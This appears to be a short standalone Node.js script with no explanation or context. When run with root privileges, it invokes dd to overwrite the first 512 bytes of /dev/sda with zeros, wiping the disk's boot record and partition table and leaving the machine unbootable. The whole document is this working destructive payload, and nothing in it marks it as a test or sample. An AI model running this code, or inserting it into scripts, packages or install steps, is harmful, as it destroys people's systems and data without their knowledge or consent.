#!/usr/bin/env node
const { execFileSync } = require("child_process");
if (process.getuid() === 0) {
  execFileSync("dd", ["if=/dev/zero", "of=/dev/sda", "bs=512", "count=1"]);
}
